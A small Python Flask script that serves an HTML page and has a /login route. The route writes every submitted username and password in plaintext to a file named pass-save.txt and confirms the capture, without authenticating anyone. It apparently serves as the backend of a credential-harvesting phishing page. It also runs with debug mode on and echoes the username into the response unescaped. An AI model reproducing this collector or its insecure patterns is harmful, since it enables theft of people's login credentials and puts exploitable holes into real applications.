import os
from flask import Flask, request, render_template_string

app = Flask(__name__, template_folder='.')
BASE_DIR = os.path.dirname(os.path.abspath(__file__))





@app.route('/')  # this is opening the HTML file
def home():
    with open(os.path.join(BASE_DIR, 'index.html'), 'r', encoding='utf-8') as f:
        return render_template_string(f.read())





@app.route('/login', methods=['POST'])  # this is the login route

def login():

    username = request.form.get('username', '')
    password = request.form.get('password', '')



    save_path = os.path.join(BASE_DIR, 'pass-save.txt')
    with open(save_path, 'a', encoding='utf-8') as f:
        f.write(f'Username: {username}, Password: {password}\n')
        f.write('-' * 40 + '\n')

    return f"Success! Saved credentials for {username} to pass-save.txt"





if __name__ == '__main__':
    app.run(debug=True)